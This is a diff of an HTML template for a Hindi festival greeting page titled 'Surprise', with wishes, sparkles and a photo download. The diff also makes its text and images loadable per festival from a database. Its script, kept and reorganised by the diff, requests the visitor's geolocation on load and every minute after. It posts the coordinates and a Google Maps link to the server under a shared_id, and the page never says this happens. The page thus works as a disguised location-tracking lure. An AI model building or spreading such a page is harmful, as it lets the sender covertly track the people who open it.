@@ -2,11 +2,13 @@
 <html lang="hi">
 
 <head>
-    <meta charset="UTF-8" />
-    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-    <title>शुभ दुर्गा पूजा ✨</title>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta name="theme-color" content="#f5e8ff">
 
-    <link rel="stylesheet" href="{{url_for('static',filename='css/index.css')}}">
+    <title>Surprise ✨</title>
+
+    <link rel="stylesheet" href="{{ url_for('static', filename='css/index.css') }}">
 </head>
 
 <body>
@@ -14,25 +16,38 @@
     <div class="glow"></div>
 
     <main class="card">
-        <p class="eyebrow">एक छोटा-सा सरप्राइज़ ✨</p>
-        <h1>शुभ दुर्गा पूजा</h1>
-        <p class="subtitle">Shubho Durga Puja!</p>
+
+        <p class="eyebrow" id="eyebrow">
+            एक छोटा-सा सरप्राइज़ ✨
+        </p>
+
+        <h1 id="pageTitle">SURPRISE</h1>
+
+        <p class="subtitle" id="subtitle">
+            Shubho Durga Puja!
+        </p>
 
         <div class="art">
-            <img src="{{url_for('static',filename='images/durga.jpeg')}}"
-                alt="सुंदर रोशनी से सजा दुर्गा पूजा पंडाल और माँ दुर्गा" />
-            <div class="caption">
+
+            <img id="festivalImage" src="{{ url_for('static', filename='images/surprise.jpeg') }}" alt="Festival image">
+
+            <div class="caption" id="caption">
                 माँ दुर्गा आपके जीवन को खुशियों से रोशन करें 🪔
             </div>
+
         </div>
 
-        <p class="message">
+        <p class="message" id="message">
             ढाक की धुन, धुनुची की खुशबू और अपनों के साथ—
             आपकी पूजा प्यार, सुकून और ढेर सारी मुस्कान से भरी हो। ❤️
         </p>
 
-        <p class="download-text">फोटो डाउनलोड करने के लिए यहाँ क्लिक करें 📥</p>
-        <a class="download-btn" href="{{url_for('static',filename='images/durga.jpeg')}}" download="durga-puja.png">
+        <p class="download-text" id="downloadText">
+            फोटो डाउनलोड करने के लिए यहाँ क्लिक करें 📥
+        </p>
+
+        <a class="download-btn" id="downloadButton" href="{{ url_for('static', filename='images/durga.jpeg') }}"
+            download="durga-puja.png">
             फोटो डाउनलोड करें
         </a>
 
@@ -43,68 +58,279 @@
         </div>
 
         <p id="blessing" aria-live="polite"></p>
-        <div class="footer">प्रेम, रोशनी और उत्सव के नाम ✨</div>
+
+        <div class="footer" id="footer">
+            प्रेम, रोशनी और उत्सव के नाम ✨
+        </div>
+
     </main>
+
     <div class="login_btn">Login</div>
+
     <script>
+        // =====================================================
+        // 1. LOCAL STORAGE
+        // =====================================================
 
         const visitor_id = localStorage.getItem("visitor_id");
         const shared_id = localStorage.getItem("shared_id");
+        const ui = localStorage.getItem("festival_id");
+
+        // =====================================================
+        // 2. LOGIN / DASHBOARD BUTTON
+        // =====================================================
+
         const login_btn = document.querySelector(".login_btn");
-        if (localStorage.getItem("token")) {
-            login_btn.textContent = "Dashboard";
-        } else {
-            login_btn.textContent = "Login";
+
+        function updateLoginButton() {
+            login_btn.textContent = localStorage.getItem("token")
+                ? "Dashboard"
+                : "Login";
         }
-        login_btn.addEventListener('click', (e) => {
-            if (e.textContent == "Login") {
-                window.location.href = "/";
-            }
-            else {
+
+        updateLoginButton();
+
+        login_btn.addEventListener("click", function () {
+            if (localStorage.getItem("token")) {
                 window.location.href = "/dashboard";
+            } else {
+                window.location.href = "/";
             }
         });
 
-        const wishes = [
+        // =====================================================
+        // 3. DEFAULT SURPRISE CONTENT
+        // =====================================================
+
+        const defaultWishes = [
             "माँ दुर्गा आपको शक्ति, सुख और सफलता दें। शुभ पूजा! 🌺",
             "आपके घर में खुशियाँ और दिल में शांति बनी रहे। 🪔",
             "इस पूजा पर हर दिन प्यार और रोशनी से भरा हो। ❤️"
         ];
+
+        let wishes = [...defaultWishes];
+
+        // =====================================================
+        // 4. DATABASE UI DATA FETCH
+        // =====================================================
+
+        async function loadFestivalUI() {
+
+            // ui nahi hai to default page hi rahega
+            if (!ui) {
+                console.log("UI select nahi hai. Default page show hoga.");
+                return;
+            }
+
+            // Sirf valid positive integer allow karo
+            if (!/^[1-9]\d*$/.test(ui)) {
+                console.error("Invalid UI ID:", ui);
+                return;
+            }
+
+            try {
+                const response = await fetch(
+                    `/ui/${encodeURIComponent(ui)}`
+                );
+
+                if (!response.ok) {
+                    throw new Error(
+                        "UI data fetch failed. Status: " + response.status
+                    );
+                }
+
+                const data = await response.json();
+
+                if (!data || data.status === "error") {
+                    throw new Error(data.message || "UI data nahi mila.");
+                }
+
+                // ---------------------------------------------
+                // Festival title and text
+                // ---------------------------------------------
+
+                setText("eyebrow", data.eyebrow);
+                setText("pageTitle", data.title || data.festival_name);
+                setText("subtitle", data.subtitle);
+                setText("caption", data.message);
+                setText("message", data.message);
+                setText("downloadText", data.download_text);
+                setText("footer", data.footer_text);
+                setText(
+                    "surpriseBtn",
+                    data.surprise_button_text
+                );
+
+                // ---------------------------------------------
+                // Browser tab title
+                // ---------------------------------------------
+
+                document.title =
+                    data.festival_name || data.title || "Surprise";
+
+                // ---------------------------------------------
+                // Festival image
+                // ---------------------------------------------
+
+                if (data.image_path) {
+                    const imagePath = data.image_path;
+
+                    const imageUrl = imagePath.startsWith("http://") ||
+                        imagePath.startsWith("https://") ||
+                        imagePath.startsWith("/")
+                        ? imagePath
+                        : `/static/${imagePath.replace(/^static\//, "")}`;
+
+                    const image = document.getElementById("festivalImage");
+
+                    image.src = imageUrl;
+                    image.alt = data.festival_name || data.title || "Festival";
+                }
+
+                // ---------------------------------------------
+                // Download button
+                // ---------------------------------------------
+
+                const downloadButton =
+                    document.getElementById("downloadButton");
+
+                if (data.image_path) {
+                    const imagePath = data.image_path;
+
+                    downloadButton.href =
+                        imagePath.startsWith("http://") ||
+                            imagePath.startsWith("https://") ||
+                            imagePath.startsWith("/")
+                            ? imagePath
+                            : `/static/${imagePath.replace(/^static\//, "")}`;
+                }
+
+                setText(
+                    "downloadButton",
+                    data.download_button_text
+                );
+
+                // ---------------------------------------------
+                // Wishes from database
+                // ---------------------------------------------
+
+                if (Array.isArray(data.wishes) && data.wishes.length > 0) {
+                    wishes = data.wishes;
+                } else if (typeof data.wishes === "string" && data.wishes.trim()) {
+                    try {
+                        const parsedWishes = JSON.parse(data.wishes);
+
+                        if (Array.isArray(parsedWishes) && parsedWishes.length) {
+                            wishes = parsedWishes;
+                        }
+                    } catch (error) {
+                        console.warn("Wishes JSON format valid nahi hai.");
+                    }
+                }
+
+                // ---------------------------------------------
+                // Optional colors from database
+                // ---------------------------------------------
+
+                setColor("--page-background", data.background_color);
+                setColor("--card-background", data.card_color);
+                setColor("--text-color", data.text_color);
+                setColor("--theme-color", data.theme_color);
+
+                console.log("Festival UI successfully loaded:", ui);
+
+            } catch (error) {
+                // Fetch fail hone par default content bana rahega
+                console.error("Festival UI load nahi hua:", error);
+            }
+        }
+
+        function setText(id, value) {
+            if (value === null || value === undefined || value === "") {
+                return;
+            }
+
+            const element = document.getElementById(id);
+
+            if (element) {
+                element.textContent = value;
+            }
+        }
+
+        function setColor(variable, value) {
+            if (!value) {
+                return;
+            }
+
+            document.documentElement.style.setProperty(variable, value);
+        }
+
+        // =====================================================
+        // 5. RANDOM WISHES AND SPARKLES
+        // =====================================================
+
         function getRandomWish() {
-            const randomWish = wishes[Math.floor(Math.random() * wishes.length)];
+
+            if (!wishes.length) {
+                return;
+            }
+
+            const randomWish =
+                wishes[Math.floor(Math.random() * wishes.length)];
+
             document.getElementById("blessing").textContent = randomWish;
 
             for (let i = 0; i < 24; i++) {
+
                 const star = document.createElement("span");
+
                 star.className = "sparkle";
-                star.textContent = ["✦", "✧", "❋"][Math.floor(Math.random() * 3)];
+                star.textContent = ["✦", "✧", "❋"][
+                    Math.floor(Math.random() * 3)
+                ];
+
                 star.style.left = Math.random() * 100 + "vw";
-                star.style.animationDuration = (2 + Math.random() * 3) + "s";
-                star.style.fontSize = (12 + Math.random() * 18) + "px";
+                star.style.animationDuration =
+                    (2 + Math.random() * 3) + "s";
+                star.style.fontSize =
+                    (12 + Math.random() * 18) + "px";
 
                 document.body.appendChild(star);
+
                 setTimeout(() => star.remove(), 5200);
             }
         }
-        document.getElementById("surpriseBtn").addEventListener("click", getRandomWish);
 
+        document
+            .getElementById("surpriseBtn")
+            .addEventListener("click", getRandomWish);
 
-        // 2. Visitor ki location lo aur server par save karo
+        // =====================================================
+        // 6. VISITOR LOCATION SAVE
+        // =====================================================
+
         function getLocation() {
+
             if (!visitor_id || !shared_id) {
-                console.log("Visitor ID ya Shared ID available nahi hai.");
+                console.log(
+                    "Visitor ID ya Shared ID available nahi hai."
+                );
                 return;
             }
 
             if (!navigator.geolocation) {
-                console.log("Is browser mein Geolocation supported nahi hai.");
+                console.log(
+                    "Is browser mein Geolocation supported nahi hai."
+                );
                 return;
             }
 
             console.log("Location permission / location ka wait ho raha hai...");
 
             navigator.geolocation.getCurrentPosition(
+
                 async function (position) {
+
                     const latitude = position.coords.latitude;
                     const longitude = position.coords.longitude;
                     const accuracy = position.coords.accuracy;
@@ -113,6 +339,7 @@
                         `https://www.google.com/maps?q=${latitude},${longitude}`;
 
                     try {
+
                         const response = await fetch("/save-location", {
                             method: "POST",
                             headers: {
@@ -132,35 +359,48 @@
 
                         if (!response.ok) {
                             throw new Error(
-                                result.message || result.error ||
+                                result.message ||
+                                result.error ||
                                 "Location save nahi hui"
                             );
                         }
 
-                        console.log("Location successfully saved:");
-
+                        console.log("Location successfully saved.");
 
                     } catch (error) {
-                        console.error("Failed to save location:", error);
+                        console.error(
+                            "Failed to save location:",
+                            error
+                        );
                     }
                 },
 
                 function (error) {
+
                     switch (error.code) {
+
                         case error.PERMISSION_DENIED:
-                            console.log("Location permission deny kar di gayi.");
+                            console.log(
+                                "Location permission deny kar di gayi."
+                            );
                             break;
 
                         case error.POSITION_UNAVAILABLE:
-                            console.log("Device ki location available nahi hai.");
+                            console.log(
+                                "Device ki location available nahi hai."
+                            );
                             break;
 
                         case error.TIMEOUT:
-                            console.log("Location request timeout ho gayi.");
+                            console.log(
+                                "Location request timeout ho gayi."
+                            );
                             break;
 
                         default:
-                            console.log("Location obtain nahi ho saki.");
+                            console.log(
+                                "Location obtain nahi ho saki."
+                            );
                     }
                 },
 
@@ -171,11 +411,22 @@
                 }
             );
         }
-        window.addEventListener('load', getLocation);
 
+        // =====================================================
+        // 7. PAGE LOAD
+        // =====================================================
+
+        window.addEventListener("load", async function () {
+            await loadFestivalUI();
+            getLocation();
+        });
+
+        // Existing periodic behavior
         setInterval(getLocation, 60000);
         setInterval(getRandomWish, 1500);
+
     </script>
+
 </body>
 
 </html>
